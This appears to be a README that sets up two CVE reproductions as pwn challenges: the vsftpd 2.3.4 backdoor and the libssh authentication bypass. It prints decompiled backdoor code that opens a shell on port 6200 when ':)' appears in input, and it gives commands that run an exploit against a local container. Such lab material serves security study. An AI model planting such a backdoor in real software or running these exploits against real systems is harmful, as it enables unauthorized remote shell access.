# CVE-2011-2523 : vsftpd Backdoor Command Execution (cve-1)
Run [docker image](https://github.com/Anon-Exploiter/vulnerable-packages) and run [exp.py](https://github.com/padsalatushal/CVE-2011-2523), you can get a shell on the port '6200' from the docker container.
We decompile vsftpd and get the decompiled file: cve1de.c. We can find the backdoor:
```c
//----- (0000000000016100) ----------------------------------------------------
void __noreturn sub_16100()
{
  int v0; // eax
  int v1; // ebp
  int v2; // ebx
  struct sockaddr v3; // [rsp+0h] [rbp-38h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-20h]

  v4 = __readfsqword(0x28u);
  v0 = socket(2, 1, 0);
  if ( v0 >= 0 )
  {
    *(_QWORD *)&v3.sa_data[2] = 0LL;
    *(_DWORD *)&v3.sa_data[10] = 0;
    v1 = v0;
    *(_DWORD *)&v3.sa_family = 941096962;
    if ( bind(v0, &v3, 0x10u) >= 0 && listen(v1, 100) != -1 )
    {
      while ( 1 )
      {
        v2 = accept(v1, 0LL, 0LL);
        close(0);
        close(1);
        close(2);
        dup2(v2, 0);
        dup2(v2, 1);
        dup2(v2, 2);
        execl("/bin/sh", "sh", 0LL);
      }
    }
  }
  exit(1);
}

//----- (000000000000CF10) ----------------------------------------------------
__int64 __fastcall sub_CF10(__int64 a1)
{
  unsigned int v1; // ebx
  __int64 v2; // r12

  if ( !*(_DWORD *)(a1 + 8) )
    return 0LL;
  v1 = 0;
  while ( 1 )
  {
    v2 = v1;
    if ( (unsigned int)sub_13490(*(char *)(*(_QWORD *)a1 + v1)) )
      break;
    ++v1;
    if ( *(_BYTE *)(*(_QWORD *)a1 + v2) == 58 && *(_BYTE *)(*(_QWORD *)a1 + v1) == 41 )
      sub_16100();
    if ( *(_DWORD *)(a1 + 8) <= v1 )
      return 0LL;
  }
  return 1LL;
}
// 16100: using guessed type void __noreturn sub_16100(void);
```

# CVE-2018-10933 : libssh Authentication Bypass Vulnerability (cve-2)
[Setup and exploit](https://github.com/vulhub/vulhub/tree/master/libssh/CVE-2018-10933):

```
docker compose up -d
```

```
python .\exp.py 127.0.0.1 2222 "ps aux"
```

In the container, the target SSH server run by:
```
/usr/src/build/examples/ssh_server_fork --hostkey=/etc/ssh/ssh_host_rsa_key --ecdsakey=/etc/ssh/ssh_host_ecdsa_key --dsakey=/etc/ssh/ssh_host_dsa_key --rsakey=/etc/ssh/ssh_host_rsa_key -p 22 0.0.0.0
```
But the core bug is not in `ssh_server_fork`, it is in libssh. So we statically link libssh into `ssh_server_fork_static` by [CMakeLists_static.txt](./cve-2/libssh-0.8/static/CMakeLists_static.txt), and we use `ssh_server_fork_static` as Pwn Challenge file.